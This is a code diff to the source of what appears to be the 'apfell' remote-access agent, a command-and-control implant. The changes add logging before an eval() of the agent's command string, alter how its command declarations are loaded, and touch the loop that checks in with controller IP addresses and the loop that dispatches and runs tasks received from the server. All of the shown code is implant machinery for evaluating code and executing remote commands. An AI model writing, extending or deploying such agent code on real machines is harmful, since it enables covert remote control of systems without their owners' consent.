@@ -95,6 +95,7 @@ default_load = function(contents){
     var module = {exports: {}};
     var exports = module.exports;
     if(typeof contents == "string"){
+        console.log("about to eval the command string");
         eval(contents);
     }
     else{
@@ -122,10 +123,12 @@ base64_encode = function(data){
     var encoded = ns_data.base64EncodedStringWithOptions(0).js;
     return encoded;
 };
-    var commands_string = "" +
+    var commands_string = `
 //-------------COMMAND DECLARATIONS AND IMPLEMENTATIONS -----------------------
-"";
+`;
+    //console.log("about to load commands");
     var commands_dict = default_load(commands_string);
+    //console.log("loaded commands");
 //-------------GET IP AND CHECKIN ----------------------------------
 for(var i=0; i < apfell.ip.length; i++){
 	ip = apfell.ip[i];
@@ -152,7 +155,6 @@ sleepWakeUp = function(t){
 			//console.log("processing task");
 			try{
 			    var output = commands_dict[command](task, command, params);
-
 			}
 			catch(error){
 			    if(error.toString().includes("commands_dict[command] is not a function")){
@@ -162,8 +164,6 @@ sleepWakeUp = function(t){
 			        output = error.toString();
 			    }
 			}
-//----------------------------- SWITCHING CALLS -------------------------------
-			//else { output = "command not supported: " + command + " " + params; }
 			if ((typeof output) == "string"){
 			    output = convert_to_nsdata(output);
 			}
